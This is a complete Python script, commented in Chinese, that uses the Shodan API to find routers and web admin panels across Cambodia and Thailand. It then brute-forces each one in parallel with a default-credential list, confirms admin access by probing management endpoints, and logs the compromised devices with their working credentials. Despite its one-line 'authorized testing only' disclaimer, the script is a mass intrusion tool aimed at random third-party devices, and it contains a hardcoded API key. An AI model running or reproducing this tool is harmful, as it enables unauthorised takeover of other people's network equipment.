#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
严格路由器验证工具
确保每个"成功"都是真实的管理员访问权限
"""

import requests
import socket
import threading
import time
import json
from concurrent.futures import ThreadPoolExecutor
import random
import re

class StrictRouterVerification:
    def __init__(self, api_key):
        self.api_key = api_key
        self.base_url = "https://api.shodan.io"
        
        # 最有效的凭据
        self.creds = [
            ('admin', 'admin'),
            ('admin', ''),
            ('admin', 'password'),
            ('admin', '1234'),
            ('root', 'admin'),
            ('cisco', 'cisco'),
            ('admin', 'cisco'),
            ('admin', '123456'),
            ('admin', 'admin123'),
            ('user', 'user')
        ]
        
        # 验证结果
        self.verified_admin = []
        self.failed = []
        
    def get_targets(self, country_code, limit=100):
        """获取目标"""
        print(f"🔍 获取 {country_code} 的目标...")
        
        targets = []
        
        # 更精确的搜索
        queries = [
            f'country:{country_code} title:"router" port:80',
            f'country:{country_code} title:"TP-Link" port:80',
            f'country:{country_code} title:"D-Link" port:80',
            f'country:{country_code} title:"Tenda" port:80',
            f'country:{country_code} title:"Cisco" port:80',
            f'country:{country_code} title:"Netgear" port:80',
            f'country:{country_code} title:"ASUS" port:80',
            f'country:{country_code} port:8080 title:"admin"',
            f'country:{country_code} port:9090',
            f'country:{country_code} port:443 title:"login"'
        ]
        
        for query in queries:
            try:
                url = f"{self.base_url}/shodan/host/search"
                params = {
                    'key': self.api_key,
                    'query': query,
                    'limit': limit // len(queries)
                }
                
                response = requests.get(url, params=params, timeout=10)
                
                if response.status_code == 200:
                    data = response.json()
                    for match in data.get('matches', []):
                        targets.append({
                            'ip': match.get('ip_str', ''),
                            'port': match.get('port', 80),
                            'title': match.get('title', ''),
                            'country': match.get('location', {}).get('country_name', ''),
                            'org': match.get('org', ''),
                            'product': match.get('product', ''),
                            'version': match.get('version', ''),
                            'banner': match.get('banner', '')
                        })
                
                time.sleep(0.5)
                
            except Exception as e:
                print(f"❌ 查询失败: {e}")
                continue
        
        # 去重
        unique_targets = []
        seen_ips = set()
        for target in targets:
            if target['ip'] not in seen_ips:
                unique_targets.append(target)
                seen_ips.add(target['ip'])
        
        print(f"✅ 获取到 {len(unique_targets)} 个唯一目标")
        return unique_targets
    
    def strict_verify_admin_access(self, ip, port, username, password):
        """严格验证管理员访问权限"""
        try:
            auth = (username, password)
            base_url = f'http://{ip}:{port}'
            
            # 1. 首先检查是否需要认证
            try:
                no_auth_response = requests.get(base_url, timeout=5)
                if no_auth_response.status_code == 200:
                    # 如果不需要认证就能访问，检查是否是管理界面
                    if self.is_admin_interface(no_auth_response.text):
                        return self.verify_admin_functions(ip, port, None, no_auth_response.text)
            except:
                pass
            
            # 2. 尝试HTTP Basic Auth
            try:
                auth_response = requests.get(
                    base_url,
                    auth=auth,
                    timeout=5,
                    allow_redirects=True,
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                )
                
                if auth_response.status_code == 200:
                    if self.is_admin_interface(auth_response.text):
                        return self.verify_admin_functions(ip, port, auth, auth_response.text)
            except:
                pass
            
            # 3. 尝试POST登录
            try:
                login_data = {
                    'username': username,
                    'password': password,
                    'user': username,
                    'pass': password,
                    'login': 'Login',
                    'submit': 'Login',
                    'action': 'login'
                }
                
                post_response = requests.post(
                    f'{base_url}/login',
                    data=login_data,
                    timeout=5,
                    allow_redirects=True,
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                )
                
                if post_response.status_code == 200:
                    if self.is_admin_interface(post_response.text):
                        return self.verify_admin_functions(ip, port, None, post_response.text)
            except:
                pass
            
            return {'verified': False, 'reason': 'No admin access detected'}
            
        except Exception as e:
            return {'verified': False, 'reason': f'Error: {str(e)}'}
    
    def is_admin_interface(self, content):
        """检查是否是真正的管理界面"""
        content_lower = content.lower()
        
        # 必须包含的管理界面特征
        admin_indicators = [
            'dashboard', 'admin panel', 'management', 'configuration',
            'settings', 'system', 'network', 'wireless', 'wan', 'lan',
            'router', 'gateway', 'firmware', 'status', 'monitor',
            'interface', 'port', 'dhcp', 'nat', 'firewall', 'qos'
        ]
        
        # 排除登录页面的特征
        login_indicators = [
            'login', 'password', 'username', 'sign in', 'log in',
            'authentication', 'access denied', 'unauthorized'
        ]
        
        # 检查是否包含管理特征
        has_admin_features = any(indicator in content_lower for indicator in admin_indicators)
        
        # 检查是否不是登录页面
        is_not_login = not any(indicator in content_lower for indicator in login_indicators)
        
        # 检查内容长度（管理界面通常比较长）
        has_sufficient_content = len(content) > 1000
        
        return has_admin_features and is_not_login and has_sufficient_content
    
    def verify_admin_functions(self, ip, port, auth, content):
        """验证管理员功能访问"""
        try:
            base_url = f'http://{ip}:{port}'
            
            # 尝试访问敏感的管理功能
            admin_endpoints = [
                '/admin/', '/management/', '/config/', '/settings/',
                '/system/', '/network/', '/wireless/', '/status/',
                '/dhcp/', '/nat/', '/firewall/', '/qos/',
                '/firmware/', '/backup/', '/restore/'
            ]
            
            accessible_endpoints = []
            
            for endpoint in admin_endpoints:
                try:
                    if auth:
                        response = requests.get(
                            f'{base_url}{endpoint}',
                            auth=auth,
                            timeout=3
                        )
                    else:
                        response = requests.get(
                            f'{base_url}{endpoint}',
                            timeout=3
                        )
                    
                    if response.status_code == 200:
                        # 检查响应内容是否包含管理功能
                        if self.is_admin_interface(response.text):
                            accessible_endpoints.append(endpoint)
                except:
                    continue
            
            # 如果至少能访问一个管理端点，认为是成功
            if accessible_endpoints:
                return {
                    'verified': True,
                    'method': 'HTTP Basic Auth' if auth else 'No Auth',
                    'admin_endpoints': accessible_endpoints,
                    'title': self.extract_title(content),
                    'content_length': len(content),
                    'admin_features': self.extract_admin_features(content)
                }
            
            return {'verified': False, 'reason': 'No accessible admin endpoints'}
            
        except Exception as e:
            return {'verified': False, 'reason': f'Error verifying admin functions: {str(e)}'}
    
    def extract_title(self, html_content):
        """提取页面标题"""
        try:
            title_match = re.search(r'<title>(.*?)</title>', html_content, re.IGNORECASE)
            if title_match:
                return title_match.group(1).strip()
        except:
            pass
        return 'No Title'
    
    def extract_admin_features(self, content):
        """提取管理功能特征"""
        content_lower = content.lower()
        features = []
        
        feature_keywords = {
            'network': ['network', 'wan', 'lan', 'ethernet'],
            'wireless': ['wireless', 'wifi', 'wlan', 'ssid'],
            'dhcp': ['dhcp', 'ip address', 'lease'],
            'nat': ['nat', 'port forwarding', 'virtual server'],
            'firewall': ['firewall', 'filter', 'block'],
            'qos': ['qos', 'quality of service', 'bandwidth'],
            'system': ['system', 'firmware', 'reboot', 'restart'],
            'status': ['status', 'monitor', 'log', 'statistics']
        }
        
        for feature, keywords in feature_keywords.items():
            if any(keyword in content_lower for keyword in keywords):
                features.append(feature)
        
        return features
    
    def attack_single_target(self, target):
        """攻击单个目标并严格验证"""
        ip = target['ip']
        port = target['port']
        
        for username, password in self.creds:
            try:
                verification = self.strict_verify_admin_access(ip, port, username, password)
                
                if verification['verified']:
                    result = {
                        'ip': ip,
                        'port': port,
                        'username': username,
                        'password': password,
                        'method': verification['method'],
                        'admin_endpoints': verification['admin_endpoints'],
                        'title': verification['title'],
                        'content_length': verification['content_length'],
                        'admin_features': verification['admin_features'],
                        'country': target['country'],
                        'org': target['org'],
                        'product': target['product'],
                        'version': target['version'],
                        'verified': True,
                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                    }
                    
                    self.verified_admin.append(result)
                    print(f"✅ 严格验证成功: {ip}:{port} - {username}:{password} - {target['country']}")
                    print(f"   管理端点: {verification['admin_endpoints']}")
                    print(f"   管理功能: {verification['admin_features']}")
                    return result
                
            except Exception as e:
                continue
        
        # 记录失败
        self.failed.append({
            'ip': ip,
            'port': port,
            'country': target['country'],
            'org': target['org'],
            'reason': 'All credentials failed or no admin access'
        })
        return None
    
    def mass_attack_strict(self, targets, max_threads=30):
        """批量攻击并严格验证"""
        print(f"🚀 开始严格验证攻击 {len(targets)} 个目标...")
        print(f"📊 使用 {max_threads} 个线程")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(self.attack_single_target, target) for target in targets]
            
            for i, future in enumerate(futures):
                try:
                    result = future.result(timeout=30)
                    if (i + 1) % 20 == 0:
                        print(f"📊 已处理 {i + 1}/{len(targets)} 个目标")
                        
                except Exception as e:
                    if (i + 1) % 20 == 0:
                        print(f"📊 已处理 {i + 1}/{len(targets)} 个目标")
        
        return self.verified_admin
    
    def print_strict_results(self):
        """打印严格验证结果"""
        print(f"\n" + "="*80)
        print(f"🎯 严格路由器验证结果")
        print(f"="*80)
        print(f"严格验证成功: {len(self.verified_admin)} 台")
        print(f"攻击失败: {len(self.failed)} 台")
        
        if self.verified_admin:
            print(f"\n🏆 严格验证成功的设备:")
            for i, pwn in enumerate(self.verified_admin, 1):
                print(f"   {i}. {pwn['ip']}:{pwn['port']} - {pwn['username']}:{pwn['password']}")
                print(f"      国家: {pwn['country']} | 组织: {pwn['org']}")
                print(f"      方法: {pwn['method']} | 管理端点: {pwn['admin_endpoints']}")
                print(f"      管理功能: {pwn['admin_features']}")
                print(f"      标题: {pwn['title']} | 内容长度: {pwn['content_length']}")
                print()
            
            # 按国家统计
            countries = {}
            for pwn in self.verified_admin:
                country = pwn['country']
                countries[country] = countries.get(country, 0) + 1
            
            print(f"📊 按国家统计:")
            for country, count in sorted(countries.items(), key=lambda x: x[1], reverse=True):
                print(f"   {country}: {count} 台")
    
    def save_strict_results(self, filename='strict_router_verification.json'):
        """保存严格验证结果"""
        results = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'strict_verified_successful': self.verified_admin,
            'failed': self.failed,
            'total_strict_verified': len(self.verified_admin),
            'total_failed': len(self.failed)
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
        print(f"💾 严格验证结果已保存到: {filename}")

def main():
    """主函数"""
    print("🚀 严格路由器验证工具")
    print("⚠️  注意: 此工具仅用于授权的安全测试")
    print("🔍 严格验证每个成功都是真实的管理员访问权限")
    
    api_key = "8U3fd9BSqyzentffLrhocQm7rSvy44jx"
    verifier = StrictRouterVerification(api_key)
    
    # 获取目标
    print("\n🇰🇭 获取柬埔寨目标...")
    cambodia_targets = verifier.get_targets('KH', limit=50)
    
    print("\n🇹🇭 获取泰国目标...")
    thailand_targets = verifier.get_targets('TH', limit=50)
    
    # 合并目标
    all_targets = cambodia_targets + thailand_targets
    print(f"\n📋 总目标数量: {len(all_targets)} 个IP")
    
    if all_targets:
        # 开始严格验证攻击
        results = verifier.mass_attack_strict(all_targets)
        
        # 显示结果
        verifier.print_strict_results()
        
        # 保存结果
        verifier.save_strict_results()
    else:
        print("❌ 未获取到任何目标")
    
    print(f"\n💡 严格验证标准:")
    print(f"   1. 必须是真正的管理界面")
    print(f"   2. 必须能访问敏感管理功能")
    print(f"   3. 排除登录页面和错误页面")
    print(f"   4. 验证管理端点可访问性")
    print(f"   5. 确保每个成功都是可用的")

if __name__ == "__main__":
    main()